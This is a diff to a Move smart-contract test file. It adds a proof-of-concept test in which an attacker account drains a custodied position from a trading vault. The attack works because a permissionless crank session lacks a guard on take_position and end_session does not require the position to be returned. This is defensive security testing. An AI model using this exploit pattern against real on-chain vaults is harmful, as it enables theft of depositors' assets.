@@ -543,6 +543,58 @@ fun forced_session_cannot_take() {
     abort 0
 }
 
+// ═══════════════════ adversarial: crank/force position theft ═══════════════════
+//
+// CRITICAL: `begin_crank_session` is always-available and permissionless.
+// It correctly blocks `take` (forced), but `take_position` has NO forced
+// guard and `end_session` does not require positions to be re-stored.
+// Any stranger can extract a custodied position object (Coins, option
+// Positions, tickets) tagged with an adapter whose witness they can mint.
+
+/// PoC: stranger yanks a custodied position via crank session and keeps it.
+#[test]
+fun attack_crank_session_steals_position() {
+    let mut sc = ts::begin(h::admin_addr());
+    let clock = h::init_protocol(&mut sc);
+    h::new_default_vault(&mut sc);
+    h::simple_deposit(&mut sc, h::alice_addr(), 1_000_000, &clock);
+
+    // Curator custodys a position under TestAdapter.
+    ts::next_tx(&mut sc, h::curator_addr());
+    let mut v = ts::take_shared<TradingVault>(&sc);
+    let ireg = ts::take_shared<IntegrationRegistry>(&sc);
+    let cap = ts::take_from_sender<CuratorCap>(&sc);
+    let p = h::new_position(&mut sc);
+    let pid = object::id(&p);
+    let mut s = vault::begin_session(&v, &cap, &ireg, h::test_adapter());
+    vault::put_position(&mut v, &mut s, p);
+    vault::end_session(&v, s);
+    assert!(vault::position_count(&v) == 1);
+    assert!(vault::has_position(&v, pid));
+    ts::return_to_sender(&sc, cap);
+    ts::return_shared(ireg);
+    ts::return_shared(v);
+
+    // Attacker (bob) opens a crank session — always unlocked — and
+    // extracts the position without returning it.
+    ts::next_tx(&mut sc, h::bob_addr());
+    let mut v = ts::take_shared<TradingVault>(&sc);
+    let ireg = ts::take_shared<IntegrationRegistry>(&sc);
+    let mut s = vault::begin_crank_session(&v, &ireg, h::test_adapter());
+    let stolen: h::TestPosition = vault::take_position(&mut v, &mut s, pid);
+    vault::end_session(&v, s);
+
+    assert!(vault::position_count(&v) == 0);
+    assert!(!vault::has_position(&v, pid));
+    // Attacker holds the position object (on-chain: transferable out).
+    h::destroy_position(stolen);
+    ts::return_shared(ireg);
+    ts::return_shared(v);
+
+    clock.destroy_for_testing();
+    sc.end();
+}
+
 #[test]
 fun delisted_adapter_can_still_be_unwound_by_crank_and_force_sessions() {
     // SO-310: delisting is a kill switch on new deployment, not on exits.
